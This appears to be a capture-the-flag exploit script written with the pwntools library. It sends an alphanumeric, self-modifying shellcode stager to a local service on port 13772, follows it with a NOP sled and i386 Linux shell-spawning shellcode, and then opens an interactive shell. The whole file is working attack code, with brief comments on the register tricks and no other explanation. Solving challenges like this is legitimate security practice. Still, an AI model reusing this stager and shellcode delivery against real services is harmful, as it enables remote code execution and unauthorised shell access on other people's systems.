#!/usr/bin/env python3
from pwn import *
from time import sleep

context.arch = 'i386'
r = remote('localhost', 13772)

# SPLOIT #
payload = b'Y'*3 # set ecx to code start
payload += b'X'*3 # set eax = 0
payload += b'H' # dec eax, 0xff to al
payload += b'400Al' # xor ecx+0x6c ^ 0xff ^ 0x30
payload += b'@' * 3 # dec eax
payload += b'I' # dec ecx
payload += b'4P0Al' # xor ecx+0x6c ^ 0xd2 ^ ord('P')
payload += b'ZXHP[@@@A' # pop edx; pop eax; dec eax; push eax; pop ebx; inc eax*3; inc ecx
payload = payload.ljust(0x6b, b'P')
payload += b'OO'

print(len(payload))
r.sendafter(b": ", payload)
sleep(0.2)
r.send(b'\x90' * 128 + asm(shellcraft.i386.linux.sh()))

r.interactive()